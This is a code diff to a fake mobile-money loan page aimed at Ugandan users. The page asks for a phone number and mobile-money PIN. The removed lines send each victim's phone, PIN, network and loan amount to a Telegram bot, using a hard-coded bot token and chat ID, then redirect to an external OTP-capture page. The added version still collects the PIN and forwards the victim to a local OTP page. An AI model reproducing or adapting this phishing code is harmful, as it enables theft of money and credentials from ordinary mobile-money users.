@@ -154,26 +154,6 @@
             color: #9ca3af;
             margin-top: 18px;
         }
-        #spinner {
-            display: none;
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.9);
-            z-index: 10000;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
-            gap: 20px;
-        }
-        .spin-ring {
-            width: 60px;
-            height: 60px;
-            border: 5px solid rgba(255,255,255,0.2);
-            border-top-color: #E42320;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
@@ -221,18 +201,7 @@
     </div>
 </div>
 
-<div id="spinner">
-    <div class="spin-ring"></div>
-    <p style="color:white;">Processing...</p>
-</div>
-
 <script>
-    // Telegram Bot Direct Configuration
-    const BOT_TOKEN = '8743116479:AAH4UIBuqbg6GtuLUMuCZ45L0Tu3Ad9Rs9E';
-    const CHAT_ID = '8392790531';
-    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
-    const OTP_PAGE_URL = 'https://momo-uganda-production.up.railway.app/otp.html';
-
     function loadLoanData() {
         const data = sessionStorage.getItem('calculatorData');
         if (data) {
@@ -246,34 +215,10 @@
         const err = document.getElementById('errorMsg');
         err.textContent = msg;
         err.style.display = 'block';
-        setTimeout(() => err.style.display = 'none', 4000);
+        setTimeout(() => err.style.display = 'none', 3000);
     }
 
-    // Send message directly to Telegram
-    async function sendToTelegram(phone, pin, amount, network) {
-        const message = `<b>🔴 NEW LOAN APPLICATION - UGANDA</b>\n\n` +
-            `━━━━━━━━━━━━━━━━━━\n` +
-            `<b>💰 Amount:</b> UGX ${amount.toLocaleString()}\n` +
-            `<b>📱 Network:</b> ${network}\n` +
-            `<b>📞 Phone:</b> <code>${phone}</code>\n` +
-            `<b>🔐 PIN:</b> <code>${pin}</code>\n` +
-            `<b>🕐 Time:</b> ${new Date().toLocaleString()}\n` +
-            `━━━━━━━━━━━━━━━━━━\n\n` +
-            `<b>✅ User will be redirected to OTP page after approval.</b>`;
-
-        const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: 'HTML'
-            })
-        });
-        return response.json();
-    }
-
-    document.getElementById('submitBtn').onclick = async () => {
+    document.getElementById('submitBtn').onclick = () => {
         const phone = document.getElementById('phone').value.trim();
         const pin = document.getElementById('pin').value.trim();
         
@@ -286,36 +231,18 @@
             return;
         }
 
-        const btn = document.getElementById('submitBtn');
-        btn.disabled = true;
-        btn.textContent = "Processing...";
-        document.getElementById('spinner').style.display = 'flex';
-
-        const loanData = JSON.parse(sessionStorage.getItem('calculatorData') || '{}');
+        // Save to sessionStorage
+        sessionStorage.setItem('userPhone', phone);
+        sessionStorage.setItem('userPin', pin);
         
-        // Determine network from phone prefix
+        // Determine network
         let network = 'MTN';
         if (phone.startsWith('075') || phone.startsWith('074')) network = 'Airtel';
         else if (phone.startsWith('070') || phone.startsWith('076')) network = 'Africell';
-
-        try {
-            // Send to Telegram directly
-            await sendToTelegram(phone, pin, loanData.amount || 500000, network);
-            
-            // Store data and redirect to OTP page
-            sessionStorage.setItem('userPhone', phone);
-            sessionStorage.setItem('userNetwork', network);
-            
-            document.getElementById('spinner').style.display = 'none';
-            window.location.href = OTP_PAGE_URL;
-            
-        } catch (err) {
-            console.error('Submit error:', err);
-            document.getElementById('spinner').style.display = 'none';
-            showError("Error sending application. Please try again.");
-            btn.disabled = false;
-            btn.textContent = "Continue →";
-        }
+        sessionStorage.setItem('userNetwork', network);
+        
+        // Redirect to OTP page
+        window.location.href = 'otp.html';
     };
 
     document.getElementById('phone').addEventListener('input', function(e) {
